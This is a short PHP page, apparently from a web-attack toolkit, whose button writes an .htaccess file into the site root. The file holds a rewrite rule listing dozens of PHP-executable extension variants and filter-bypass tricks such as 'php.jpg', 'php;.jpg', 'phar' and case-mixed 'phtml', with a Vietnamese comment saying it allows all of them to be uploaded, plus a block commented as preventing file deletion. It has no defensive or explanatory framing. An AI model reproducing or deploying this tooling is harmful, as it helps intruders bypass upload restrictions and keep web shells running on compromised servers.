<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
    $htaccessContent = <<<EOT
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /

    # Cho phép upload tất cả các định dạng tệp được liệt kê
    RewriteRule ^.*.(php|Php|pHp|phP|Php.asp|php.anu|php.fla|PHP|php3|php2|Php1|pht|phar|anu|fla|asp|aspx|php.jpg|php6|php7|Php7|PHP7|PHp7|pHP7|PhP7|phP7|pHP5|Php5|PHP5|PHp5|pHP5|PhP5|phP5|pHP5|php8|php9|phtml|shtml|php.aspx|php;.jpg|php.fla|php.phar|fLa|flA|FLa|fLA|FlA|FLA|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip)$ [L]
</IfModule>

# Ngăn chặn việc xóa tệp
<FilesMatch ".*">
    Order Allow,Deny
    Allow from all
    Deny from env=DELETE
</FilesMatch>
EOT;

    $file = '.htaccess';
    if (file_put_contents($file, $htaccessContent)) {
        echo "File .htaccess đã được tạo thành công.";
    } else {
        echo "Không thể tạo file .htaccess.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Create .htaccess</title>
</head>
<body>
    <form method="post">
        <button type="submit" name="create">Create .htaccess</button>
    </form>
</body>
</html>
